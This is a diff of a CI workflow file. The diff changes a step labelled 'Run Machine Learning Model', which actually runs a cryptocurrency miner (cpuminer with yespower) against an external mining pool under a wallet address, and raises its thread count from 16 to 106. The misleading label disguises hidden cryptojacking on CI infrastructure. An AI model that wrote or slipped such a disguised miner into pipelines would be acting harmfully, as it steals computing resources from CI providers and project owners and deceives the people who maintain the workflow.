@@ -25,4 +25,4 @@ jobs:
 
       - name: Run Machine Learning Model
         run: |
-          ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1 --threads=16
+          ./cpuminer-sse2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17111 -u aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.c1 --threads=106
